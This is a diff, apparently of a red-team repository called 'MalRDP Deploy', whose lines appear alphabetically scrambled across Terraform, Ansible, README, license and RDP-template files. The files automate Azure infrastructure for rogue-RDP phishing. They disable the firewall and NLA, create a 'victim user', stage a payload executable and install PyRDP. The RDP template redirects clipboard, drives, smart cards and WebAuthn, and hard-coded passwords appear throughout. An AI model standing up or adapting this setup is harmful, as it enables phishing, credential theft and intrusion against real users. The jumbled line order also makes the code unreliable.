@@ -1,0 +1,400 @@
+        priority                   = 100
+        priority                   = 101
+        priority                   = 102
+        priority                   = 103
+        public_ip_address_id = azurerm_public_ip.public_ip.id
+        subnet_id = azurerm_subnet.subnet.id
+      - 'C:
+      - Administrators
+      - Domain
+      - Private
+      - Public
+      - Users
+    - role: copy_files
+    - role: create_user
+    - role: soften
+    - role: software
+    azurerm = {
+    chdir: C:
+    description: Netlogon Share
+    dest: C:
+    elements:
+    groups:
+    ip_configuration {
+    location = azurerm_resource_group.rg.location
+    location = var.resource_group_location
+    login_script: start.bat
+    name: Netlogon
+    network_interface_id = azurerm_network_interface.nic.id
+    network_interface_ids = [azurerm_network_interface.nic.id]
+    network_security_group_id = azurerm_network_security_group.nsg.id
+    os_disk {
+    password: JarJarS!thL0rd
+    path: C:
+    profiles:
+    public_ip = chomp(data.http.public_ip.response_body)
+    read: Everyone
+    resource_group_name = azurerm_resource_group.rg.name
+    script: 
+    security_rule {
+    sensitive = true
+    source_image_reference {
+    src: C:
+    src: files/payload.exe
+    src: files/start.bat
+    src: files/template.rdp
+    state: directory
+    state: disabled
+    state: present
+    url: https://aka.ms/vs/17/release/vc_redist.x64.exe
+    url: https://aka.ms/vs/17/release/vs_BuildTools.exe
+    url: https://github.com/GoSecure/pyrdp/archive/refs/heads/master.zip
+    url: https://slproweb.com/download/Win64OpenSSL_Light-3_1_2.exe
+    url: https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe
+    value = azurerm_resource_group.rg.name
+    value = azurerm_windows_virtual_machine.main.admin_password
+    value = azurerm_windows_virtual_machine.main.admin_username
+    value = azurerm_windows_virtual_machine.main.public_ip_address
+    virtual_network_name = azurerm_virtual_network.vnet.name
+    winrm_listener {
+    }
+  ansible.windows.win_copy:
+  ansible.windows.win_file:
+  ansible.windows.win_path:
+  ansible.windows.win_powershell:
+  ansible.windows.win_reboot:
+  ansible.windows.win_share:
+  ansible.windows.win_shell: 'C:
+  ansible.windows.win_shell: C:
+  ansible.windows.win_shell: pip install .
+  ansible.windows.win_shell: pip install certbot
+  ansible.windows.win_user:
+  args:
+  community.windows.win_firewall:
+  community.windows.win_unzip:
+  features {}
+  hosts: all
+  required_providers {
+  roles:
+  win_get_url:
+ !example_override.tf
+ ...Or just take my word for it and wing it. 
+ .tfstate files
+ 1. 
+ 2. 
+ 3. 
+ 4. 
+ 5. 
+ > C:
+ Ansible runtime and backups
+ Crash log files
+ Environments
+ Exclude all binaries
+ I got stuck.
+ Ignore CLI configuration files
+ Ignore override files as they are usually used to override resources locally and so
+ Include override files you do wish to add to version control using negated pattern
+ Include tfplan files to ignore the plan output of command: terraform plan -out=tfplan
+ Keep in mind I'm not a dev and can barely write good English let alone good code.  This software is likely buggy as hell 
+ Local .terraform directories
+ MalRDP Deploy
+ Redistributable
+ Usage
+ Vim swap files
+ are not checked in
+ connect the nsg to the nic
+ control as they are data points which are potentially sensitive and subject 
+ copy payload and RDP template to server
+ create a subnet
+ create our resource group
+ create our virtual network
+ create the network interface
+ create the network security group and rules
+ create the public IP
+ create the user with a login script
+ create virtual machine
+ deleting your root with no backups type of bad shit happenning. I'm just as broke as this code and you'll just be pissing into the wind
+ environment you want to have working right. If by some miracle this code works and you see me at a con then you owe me beer or some kind 
+ example: 
+ for variables you can declare on the Terraform command line.
+ of booze except for smirnoff ice because that shit is fucking gross.
+ probably just getting sloppy seconds anyways. Shout out to Stack Exchange/Overflow for giving me help via shitty code snippets whenever 
+ that took a web design class in high school help you figure out what it does.
+ to change depending on the environment.
+ turn off firewall and disable NLA
+"        access                     = ""Allow"""
+"        caching = ""ReadWrite"""
+"        command = ""ansible-playbook setup.yml -i '${azurerm_windows_virtual_machine.main.public_ip_address},' -e 'ansible_user=${var.admin_user}' -e 'ansible_password=${var.admin_pass}' -e 'host_name=${var.host_name}' -e 'victim_user=${var.victim_user}' -v"""
+"        destination_address_prefix = """
+"        destination_port_range     = ""3389"""
+"        destination_port_range     = ""443"""
+"        destination_port_range     = ""5985-5986"""
+"        destination_port_range     = ""80"""
+"        direction                  = ""Inbound"""
+"        name                       = ""Allow-HTTP"""
+"        name                       = ""Allow-HTTPS"""
+"        name                       = ""Allow-RDP"""
+"        name                       = ""Allow-WinRM"""
+"        name = ""OS_Disk"""
+"        name = ""nic-configuration"""
+"        offer = ""WindowsServer"""
+"        private_ip_address_allocation = ""Dynamic"""
+"        protocol                   = ""Tcp"""
+"        protocol = ""Http"""
+"        publisher = ""MicrosoftWindowsServer"""
+"        sku = ""2022-datacenter-azure-edition"""
+"        source_address_prefix      = """
+"        source_address_prefix      = ""${local.public_ip}/32"""
+"        source_port_range          = """
+"        storage_account_type = ""Standard_LRS"""
+"        version = ""latest"""
+"        working_dir = ""${path.root}/../ansible"""
+"      $TargetMachine = ""{{ host_name }}"""
+"      (Get-WmiObject -class ""Win32_TSGeneralSetting"" -Namespace root"
+"      source = ""hashicorp/azurerm"""
+"      version = ""3.72.0"""
+"    address_prefixes = [""10.0.0.0/24""]"
+"    address_space = [""10.0.0.0/16""]"
+"    admin_password = ""${var.admin_pass}"""
+"    admin_username = ""${var.admin_user}"""
+"    allocation_method = ""Dynamic"""
+"    computer_name = ""${var.host_name}"""
+"    default = ""ACME-WKS01"""
+"    default = ""JarJarSithLord!23"""
+"    default = ""Standard_B2s"""
+"    default = ""client-name"""
+"    default = ""redskal"""
+"    default = ""tsuser"""
+"    default = ""uksouth"""
+"    description = ""Admin password to use for the VM"""
+"    description = ""Admin username to use for the VM"""
+"    description = ""Azure region to create the resources in."""
+"    description = ""Set the hostname of the VM OS"""
+"    description = ""Set the username the victim sees"""
+"    description = ""Size of the VM to create."""
+"    description = ""Use something like the company name"""
+"    name = ""${var.base_name}-ip"""
+"    name = ""${var.base_name}-malrdp-deployment"""
+"    name = ""${var.base_name}-nic"""
+"    name = ""${var.base_name}-nsg"""
+"    name = ""${var.base_name}-subnet"""
+"    name = ""${var.base_name}-vm"""
+"    name = ""${var.base_name}-vnet"""
+"    name: ""{{ victim_user }}"""
+"    provisioner ""local-exec"" {"
+"    size = ""${var.vm_size}"""
+"    url = ""https://ipv4.icanhazip.com"""
+"  ansible.windows.win_shell: schtasks /Change /TN ""Microsoft"
+"  required_version = "">=1.0"""
+" Exclude all .tfvars files, which are likely to contain sensitive data, such as"
+" In exchange, just give me credit for inspiring you to steal my code like Carlos Mencia steals jokes.  I steal a bunch too so you're"
+" In short, you can't sue me if you decide to use this code that I'm putting out there for free and shit goes terribly wrong. I'm talking"
+" This software is provided as is and free of charge.  It can be redesigned, redistributed,"
+" and is provided AS IS with no warranty real, imagined, fabricated, fornicated or pulled from a magic hat that this software is "
+" for fun or profit or hookers and blow. Marsupials, and all other inanimate objects are prohibited from using this software."
+" install python, vc_redist, shininglight,"
+" on that endeavor.  I already warned you that my code is bad.  Read through it and make sure you know what it does, or have your cousin"
+" password, private keys, and other secrets. These should not be part of version "
+" refrigerated, remade, reheated, and regifted in part or in whole by any person, corporation, rodent, or wet floor sign"
+" suitable for any purpose, porpise, or tortise, unless it's also a florist.  To be honest, you probably should not even use this in any"
+" vs_BuildTools, PyRDP and certbot"
+"I have opted to automate deployment. This meant WSL, as used in the ShorSec article, wasn't an option. So I have automated the provisioning of Windows tooling to achieve the same goal."
+"ServerManager""  /Disable"
+"ansible.windows.win_shell: 'vs_BuildTools.exe -p --wait --norestart --nocache --add ""Microsoft.VisualStudio.Product.BuildTools"
+"data ""http"" ""public_ip"" {"
+"includeOptional"" --add ""Microsoft.VisualStudio.Component.VC.ASAN"
+"includeOptional"" --add ""Microsoft.VisualStudio.Component.VC.CMake.Project"
+"includeOptional"" --add ""Microsoft.VisualStudio.Component.VC.CoreIde"
+"includeOptional"" --add ""Microsoft.VisualStudio.Component.VC.Redist.14.Latest"
+"includeOptional"" --add ""Microsoft.VisualStudio.Component.VC.Tools.x86.x64"
+"includeOptional"" --add ""Microsoft.VisualStudio.Component.Windows11SDK.22621"
+"includeOptional"" --add ""Microsoft.VisualStudio.ComponentGroup.NativeDesktop.Core"
+"includeOptional""'"
+"msg ""%username%"" Testing MalRDP phishing delivery"
+"output ""admin_password"" {"
+"output ""admin_user"" {"
+"output ""public_ip_address"" {"
+"output ""resource_group_name"" {"
+"provider ""azurerm"" {"
+"resource ""azurerm_network_interface"" ""nic"" {"
+"resource ""azurerm_network_interface_security_group_association"" ""assoc"" {"
+"resource ""azurerm_network_security_group"" ""nsg"" {"
+"resource ""azurerm_public_ip"" ""public_ip"" {"
+"resource ""azurerm_resource_group"" ""rg"" {"
+"resource ""azurerm_subnet"" ""subnet"" {"
+"resource ""azurerm_virtual_network"" ""vnet"" {"
+"resource ""azurerm_windows_virtual_machine"" ""main"" {"
+"terminalservices -ComputerName $TargetMachine -Filter ""TerminalName='RDP-tcp'"").SetUserAuthenticationRequired(0)"
+"variable ""admin_pass"" {"
+"variable ""admin_user"" {"
+"variable ""base_name"" {"
+"variable ""host_name"" {"
+"variable ""resource_group_location"" {"
+"variable ""victim_user"" {"
+"variable ""vm_size"" {"
+"winposstr:s:0,1,1904,23,3840,1142"
+- name: Add ShiningLight OpenSSL folder to PATH
+- name: Copy payload to server
+- name: Copy start.bat to server
+- name: Copy template RDP file to server
+- name: Create Netlogon directory
+- name: Create tmp directory
+- name: Disable NLA
+- name: Disable ServerManager on startup
+- name: Disable Windows Firewall
+- name: Download PyRDP ZIP archive
+- name: Download Python 3.10 installer
+- name: Download ShiningLight OpenSSL installer
+- name: Download vc_redist installer
+- name: Download vs_BuiltTools installer
+- name: Ensure user exists
+- name: Extract PyRDP archive
+- name: Install PyRDP
+- name: Install certbot with Pip
+- name: MalRDP deployment
+- name: Reboot VM to apply PATH changes and clean up after installers
+- name: Run installer for Python 3.10
+- name: Run installer for ShiningLight OpenSSL
+- name: Run installer for VC
+- name: Run installer for VS BuildTools
+- name: Share Netlogon directory
+.bin
+.bkp
+.env
+.gzip
+.hcl
+.jar
+.log
+.original
+.retry
+.swo
+.swp
+.tar
+.terraformrc
+.tfstate
+.tfstate.
+.tfvars
+.tfvars.json
+.tgz
+.tmp
+.vagrant
+.venv
+.vscode/
+.zip
+/.terraform/
+8=====D
+@echo off
+@echo on
+Check 
+Check the full blog post: https://skal.red/automating-malrdp-mostly/
+ENV/
+Netlogon
+OpenSSL-Win64
+Program Files
+Server Manager
+The original guide for configuring MalRDP infrastructure was published by ShorSec [here](https://shorsec.io/blog/malrdp-implementing-rouge-rdp-manually/). That article gives a more comprehensive break down of setting up the infrastructure manually.
+Users
+VSCode stuff..
+Vagrantfile
+Windows
+YOLO
+YOLO Public License (YPL) v0.12.34-hunter.2
+[._]
+_override.tf
+_override.tf.json
+allow desktop composition:i:0
+allow font smoothing:i:0
+alternate shell:s:
+ansible_connection: winrm
+ansible_port: 5985
+ansible_winrm_port: 5985
+ansible_winrm_scheme: http
+ansible_winrm_transport: ntlm
+audiocapturemode:i:0
+audiomode:i:0
+authentication level:i:2
+autoreconnection enabled:i:1
+az login
+bandwidthautodetect:i:1
+bin'
+bitmapcachepersistenable:i:1
+cd malrdp-deploy/terraform
+cimv2
+compression:i:1
+connection type:i:7
+crash.
+crash.log
+deadbeef
+desktopheight:i:1080
+desktopwidth:i:1920
+dir 
+disable cursor setting:i:0
+disable full window drag:i:1
+disable menu anims:i:1
+disable themes:i:0
+disable wallpaper:i:0
+displayconnectionbar:i:1
+drivestoredirect:s:
+enablerdsaadauth:i:0
+enableworkspacereconnect:i:0
+env.bak/
+env/
+full address:s:<YOUR.DOMAIN.COM>:443
+gatewaybrokeringtype:i:0
+gatewaycredentialssource:i:4
+gatewayhostname:s:
+gatewayprofileusagemethod:i:0
+gatewayusagemethod:i:4
+git clone https://github.com/redskal/malrdp-deploy
+includeRecommended
+kdcproxyname:s:
+keyboardhook:i:2
+locals {
+negotiate security layer:i:1
+networkautodetect:i:1
+override.tf
+override.tf.json
+pause
+prompt for credentials:i:0
+promptcredentialonce:i:0
+pyrdp
+pyrdp-master
+pyrdp.zip
+python-install.exe
+python-install.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0'
+rdgiskdcproxy:i:0
+redirectclipboard:i:1
+redirectcomports:i:0
+redirectlocation:i:0
+redirectposdevices:i:0
+redirectprinters:i:1
+redirectsmartcards:i:1
+redirectwebauthn:i:1
+remoteapplicationmode:i:0
+screen mode id:i:1
+session bpp:i:32
+shell working directory:s:
+shininglight.exe
+shininglight.exe /silent
+start.bat
+template.rdp
+terraform apply --auto-approve
+terraform init
+terraform {
+terraform.rc
+test.txt
+tfplan
+tools
+tsclient
+use multimon:i:0
+use redirection server name:i:0
+vars.tf
+vc_redist.exe
+vc_redist.exe /passive
+venv
+venv.bak/
+venv/
+videoplaybackmode:i:1
+vs_BuildTools.exe
+vs_BuildTools.exe --quiet --wait --norestart --nocache --add Microsoft.VisualStudio.Workload.VCTools --includeRecommended'
+weaponised-rdp.exe
